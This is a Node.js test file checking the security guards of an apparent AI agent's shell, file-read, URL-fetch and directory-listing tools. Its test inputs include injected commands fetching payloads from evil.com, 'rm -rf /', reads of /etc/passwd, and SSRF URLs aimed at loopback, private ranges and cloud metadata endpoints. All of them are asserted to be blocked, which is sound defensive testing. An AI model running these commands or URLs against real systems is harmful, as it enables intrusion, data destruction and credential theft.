/**
 * CLI tool safety corpus — node:test
 * ====================================
 * Tests the security boundaries of shellRunTool, readFileTool, fetchUrlTool,
 * and listDirectoryTool in prism-agent.mjs.
 *
 * Run: node --test scripts/__tests__/tools.test.mjs
 * (from ~/prism)
 */

import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, mkdirSync, symlinkSync, rmSync, unlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

// ── Import the tools (IS_MAIN guard prevents the agent loop from running) ──────
import {
  shellRunTool,
  readFileTool,
  fetchUrlTool,
  listDirectoryTool,
} from "../prism-agent.mjs";

// ── Test fixture: a temporary directory that IS inside process.cwd() ──────────
// We can't write to cwd directly (may be read-only in CI), so we use a subdir.
// Tests that need real in-cwd files create them here.
let tmpDir;
let tmpFile;

before(() => {
  // Create a temp dir under cwd that acts as our "project" root for path-jail tests
  tmpDir = mkdtempSync(join(process.cwd(), "test-fixture-"));
  tmpFile = join(tmpDir, "hello.txt");
  writeFileSync(tmpFile, "hello from test fixture", "utf8");

  // Nested dotfile
  writeFileSync(join(tmpDir, ".env"), "SECRET=should-be-blocked", "utf8");

  // Nested subdir with a sensitive file
  mkdirSync(join(tmpDir, "config"));
  writeFileSync(join(tmpDir, "config", ".env.local"), "LOCAL=blocked", "utf8");
  writeFileSync(join(tmpDir, "config", "deploy.key"), "PRIVKEY", "utf8");
});

after(() => {
  rmSync(tmpDir, { recursive: true, force: true });
});

// ════════════════════════════════════════════════════════════════════════════════
// shellRunTool
// ════════════════════════════════════════════════════════════════════════════════

describe("shellRunTool", () => {
  // ── Newline / null-byte injection (A4) ───────────────────────────────────────

  it("blocks \\n newline injection (R1 RCE payload)", () => {
    const r = shellRunTool("git status\ncurl http://evil.com/p.sh -o /tmp/p");
    assert.match(r, /newlines/i);
  });

  it("blocks \\r carriage-return injection", () => {
    const r = shellRunTool("git status\rrm -rf /");
    assert.match(r, /newlines/i);
  });

  it("blocks null byte", () => {
    const r = shellRunTool("git status\0curl evil.com");
    assert.match(r, /newlines/i);
  });

  it("blocks CRLF sequence", () => {
    const r = shellRunTool("npm test\r\nrm -rf /");
    assert.match(r, /newlines/i);
  });

  // ── Allowlist enforcement ─────────────────────────────────────────────────────

  it("blocks arbitrary command (rm -rf /)", () => {
    const r = shellRunTool("rm -rf /");
    assert.match(r, /allowlist/i);
  });

  it("blocks wget (not in allowlist)", () => {
    const r = shellRunTool("wget http://evil.com/payload.sh");
    assert.match(r, /allowlist/i);
  });

  it("blocks curl (not in allowlist)", () => {
    const r = shellRunTool("curl http://evil.com");
    assert.match(r, /allowlist/i);
  });

  // ── $ anchor — suffix injection must not bypass ───────────────────────────────
  // These rely on the metachar filter (;|&) catching them before the allowlist
  // would need to, but confirm the allowlist doesn't pass them if metachars were absent.

  it("blocks 'npm test; rm -rf /' (semicolon metachar)", () => {
    const r = shellRunTool("npm test; rm -rf /");
    assert.match(r, /metachar|allowlist/i);
  });

  it("blocks 'git status | cat /etc/passwd' (pipe metachar)", () => {
    const r = shellRunTool("git status | cat /etc/passwd");
    assert.match(r, /metachar|allowlist/i);
  });

  it("blocks 'git status && curl evil' (ampersand metachar)", () => {
    const r = shellRunTool("git status && curl evil");
    assert.match(r, /metachar|allowlist/i);
  });

  it("blocks backtick substitution", () => {
    const r = shellRunTool("git log `curl evil.com`");
    assert.match(r, /metachar/i);
  });

  it("blocks $(subshell) substitution", () => {
    const r = shellRunTool("git log $(curl evil.com)");
    assert.match(r, /metachar/i);
  });

  // ── Valid commands pass ───────────────────────────────────────────────────────

  it("allows: git status (exits cleanly or with change-output)", () => {
    const r = shellRunTool("git status");
    // Must not be an error string — it returns git output
    assert.ok(!r.startsWith("[shell_run error:"), `got: ${r}`);
  });

  it("allows: git log (returns log output)", () => {
    const r = shellRunTool("git log --oneline -3");
    assert.ok(!r.startsWith("[shell_run error:"), `got: ${r}`);
  });

  it("allows: tsc --version", () => {
    const r = shellRunTool("tsc --version");
    // tsc may not be installed; if error it will be an exec error, not an allowlist error
    assert.ok(!r.includes("not in allowlist"), `got: ${r}`);
  });
});

// ════════════════════════════════════════════════════════════════════════════════
// readFileTool
// ════════════════════════════════════════════════════════════════════════════════

describe("readFileTool", () => {
  // ── Path jail ─────────────────────────────────────────────────────────────────

  it("blocks absolute path outside cwd: /etc/passwd", () => {
    const r = readFileTool("/etc/passwd");
    assert.match(r, /outside working directory/i);
  });

  it("blocks traversal: ../../etc/passwd", () => {
    const r = readFileTool("../../etc/passwd");
    assert.match(r, /outside working directory|invalid path/i);
  });

  it("blocks traversal: ../../../etc/hosts", () => {
    const r = readFileTool("../../../etc/hosts");
    assert.match(r, /outside working directory|invalid path/i);
  });

  it("blocks home directory escape: ~/prism/.env (tilde not expanded by resolve)", () => {
    // resolve("~/prism/.env") makes it a literal path starting with tilde, which won't
    // be inside cwd — the jail rejects it.
    const r = readFileTool("~/prism/.env");
    assert.match(r, /outside working directory|invalid path/i);
  });

  // ── Dotfile / sensitive extension block ───────────────────────────────────────

  it("blocks .env in cwd root", () => {
    const rel = tmpFile.replace(process.cwd() + "/", "").replace(/hello\.txt$/, ".env");
    const r = readFileTool(rel);
    assert.match(r, /blocked|outside/i);
  });

  it("blocks config/.env.local (dotfile in subdir)", () => {
    const rel = tmpFile.replace(process.cwd() + "/", "").replace(/hello\.txt$/, "config/.env.local");
    const r = readFileTool(rel);
    assert.match(r, /blocked|outside/i);
  });

  it("blocks config/deploy.key (.key extension)", () => {
    const rel = tmpFile.replace(process.cwd() + "/", "").replace(/hello\.txt$/, "config/deploy.key");
    const r = readFileTool(rel);
    assert.match(r, /blocked|outside/i);
  });

  // ── Symlink escape (via realpathSync) ─────────────────────────────────────────

  it("blocks symlink inside cwd pointing to /etc/passwd", (t) => {
    const linkPath = join(tmpDir, "evil-link.txt");
    try {
      symlinkSync("/etc/passwd", linkPath);
    } catch {
      t.skip("cannot create symlink (likely CI permissions)");
      return;
    }
    const relPath = linkPath.replace(process.cwd() + "/", "");
    const r = readFileTool(relPath);
    // realpathSync resolves the symlink → real path /etc/passwd → outside jail
    assert.match(r, /outside working directory|invalid path/i);
    rmSync(linkPath, { force: true });
  });

  // ── Allowed files ─────────────────────────────────────────────────────────────

  it("allows reading a normal file inside cwd", () => {
    const relPath = tmpFile.replace(process.cwd() + "/", "");
    const r = readFileTool(relPath);
    assert.equal(r, "hello from test fixture");
  });

  it("respects max_chars truncation", () => {
    const relPath = tmpFile.replace(process.cwd() + "/", "");
    const r = readFileTool(relPath, 5);
    // 5 chars clamped to 500 minimum
    assert.equal(r, "hello from test fixture");
  });
});

// ════════════════════════════════════════════════════════════════════════════════
// fetchUrlTool — SSRF spelling table
// ════════════════════════════════════════════════════════════════════════════════

describe("fetchUrlTool SSRF", () => {
  // Each case: [label, url, expected_to_block]
  const BLOCKED = [
    // ── Loopback IPv4 ───────────────────────────────────────────────────────────
    ["127.0.0.1 (loopback)",           "http://127.0.0.1/secret"],
    ["127.0.0.2 (loopback range)",     "http://127.0.0.2/secret"],
    ["localhost",                       "http://localhost/secret"],
    ["0.0.0.0",                         "http://0.0.0.0/secret"],
    // ── Private IPv4 ────────────────────────────────────────────────────────────
    ["10.0.0.1 (RFC1918 /8)",          "http://10.0.0.1/internal"],
    ["172.16.0.1 (RFC1918 /12)",       "http://172.16.0.1/internal"],
    ["172.31.255.255 (RFC1918 /12 top)","http://172.31.255.255/internal"],
    ["192.168.1.1 (RFC1918 /16)",      "http://192.168.1.1/internal"],
    // ── Cloud metadata ───────────────────────────────────────────────────────────
    ["169.254.169.254 (AWS metadata)", "http://169.254.169.254/latest/meta-data/"],
    ["169.254.0.1 (link-local)",       "http://169.254.0.1/"],
    // ── IPv6 loopback ────────────────────────────────────────────────────────────
    ["[::1] loopback",                 "http://[::1]/secret"],
    ["[::1]:11434 (Ollama port)",       "http://[::1]:11434/api/chat"],
    // ── IPv4-mapped IPv6 (R3 finding — the bypass R2 missed) ────────────────────
    ["[::ffff:127.0.0.1] mapped IPv4", "http://[::ffff:127.0.0.1]/secret"],
    ["[::ffff:169.254.169.254] mapped metadata", "http://[::ffff:169.254.169.254]/"],
    ["[::ffff:10.0.0.1] mapped private", "http://[::ffff:10.0.0.1]/"],
    // ── ULA / link-local IPv6 ────────────────────────────────────────────────────
    ["[fc00::1] ULA",                  "http://[fc00::1]/internal"],
    ["[fd12:3456::1] ULA fd range",    "http://[fd12:3456::1]/secret"],
    ["[fe80::1] link-local",           "http://[fe80::1]/"],
    // ── Non-http schemes ─────────────────────────────────────────────────────────
    ["file:// scheme",                  "file:///etc/passwd"],
    ["ftp:// scheme",                   "ftp://example.com/file"],
  ];

  for (const [label, url] of BLOCKED) {
    it(`blocks SSRF: ${label}`, async () => {
      const r = await fetchUrlTool(url);
      assert.match(r, /\[fetch_url error:/i, `expected block but got: ${r.slice(0, 120)}`);
    });
  }

  // ── Public hosts that must pass ───────────────────────────────────────────────
  // We mock the actual network call by checking that SSRF guard doesn't reject them.
  // (Full fetch would require network; we test the guard layer only.)

  it("does NOT block public IP 1.1.1.1 (guard should pass)", async () => {
    // This will likely fail to connect, but the error should be a network error, not SSRF block.
    const r = await fetchUrlTool("http://1.1.1.1/", 500);
    assert.ok(!r.includes("URL blocked"), `SSRF guard incorrectly blocked 1.1.1.1: ${r}`);
  });

  it("does NOT block public routable IPv6 [2001:db8::1] (documentation range)", async () => {
    const r = await fetchUrlTool("http://[2001:db8::1]/", 500);
    // 2001:db8::/32 is documentation range, likely unreachable, but SSRF guard should allow
    assert.ok(!r.includes("URL blocked"), `SSRF guard incorrectly blocked [2001:db8::1]: ${r}`);
  });

  // ── Redirect-to-private (mock res.url) ───────────────────────────────────────

  it("blocks redirect to AWS metadata endpoint (res.url check)", async () => {
    // fetchUrlTool's redirect check uses res.url — simulate by patching global fetch
    const orig = globalThis.fetch;
    globalThis.fetch = async () => ({
      ok: true,
      url: "http://169.254.169.254/latest/meta-data/",
      headers: { get: () => "text/plain" },
      text: async () => "iam/security-credentials",
    });
    try {
      const r = await fetchUrlTool("https://legit.example.com/redirect");
      assert.match(r, /redirect target blocked/i);
    } finally {
      globalThis.fetch = orig;
    }
  });
});

// ════════════════════════════════════════════════════════════════════════════════
// listDirectoryTool
// ════════════════════════════════════════════════════════════════════════════════

describe("listDirectoryTool", () => {
  // ── Path jail (new in R3) ──────────────────────────────────────────────────────

  it("blocks /etc (absolute outside cwd)", () => {
    const r = listDirectoryTool("/etc");
    assert.match(r, /outside working directory/i);
  });

  it("blocks ../../ (traversal)", () => {
    const r = listDirectoryTool("../../");
    assert.match(r, /outside working directory/i);
  });

  it("blocks /tmp (outside cwd even if writeable)", () => {
    const r = listDirectoryTool("/tmp");
    assert.match(r, /outside working directory/i);
  });

  // ── Allowed ──────────────────────────────────────────────────────────────────

  it("allows '.' (cwd itself)", () => {
    const r = listDirectoryTool(".");
    // Must return a listing, not an error
    assert.ok(!r.startsWith("[list_directory error:"), `got: ${r.slice(0, 120)}`);
  });

  it("allows relative subdir inside cwd", () => {
    // Use the fixture dir; compute its path relative to cwd
    const rel = tmpDir.replace(process.cwd() + "/", "");
    const r = listDirectoryTool(rel);
    assert.ok(!r.startsWith("[list_directory error:"), `got: ${r.slice(0, 120)}`);
    // hello.txt should appear; .env should NOT (dotfile skip)
    assert.ok(r.includes("hello.txt"), `expected hello.txt in listing, got: ${r}`);
    assert.ok(!r.includes(".env"), `.env should be skipped by dotfile filter, got: ${r}`);
  });

  it("path-strip produces clean relative paths without leading slash", () => {
    const rel = tmpDir.replace(process.cwd() + "/", "");
    const r = listDirectoryTool(rel);
    const lines = r.split("\n").filter(Boolean);
    for (const line of lines) {
      assert.ok(!line.startsWith("/"), `entry has leading slash: ${line}`);
      // Should not contain the absolute path leaking into the output
      assert.ok(!line.startsWith(process.cwd()), `entry leaks absolute path: ${line}`);
    }
  });

  // ── Symlink information disclosure (documented gap) ───────────────────────────

  it("symlink inside cwd to /etc appears as a file entry (known gap — does not recurse)", (t) => {
    const linkPath = join(tmpDir, "link-to-etc");
    try {
      symlinkSync("/etc", linkPath);
    } catch {
      t.skip("cannot create symlink");
      return;
    }
    const rel = tmpDir.replace(process.cwd() + "/", "");
    const r = listDirectoryTool(rel);
    // The symlink appears as a named entry (information disclosure) but we do NOT recurse
    // into it (isDirectory() returns false for symlinks), so /etc contents don't leak.
    // This is a documented known gap — full mitigation requires realpathSync on each entry.
    const lines = r.split("\n");
    const symlinkEntry = lines.find(l => l.includes("link-to-etc"));
    if (symlinkEntry) {
      // If listed, it must NOT have trailing "/" (would indicate recursion into /etc)
      assert.ok(!symlinkEntry.endsWith("/"), `symlink incorrectly shown as directory: ${symlinkEntry}`);
    }
    try { unlinkSync(linkPath); } catch { /* symlink may not have been created */ }
  });
});
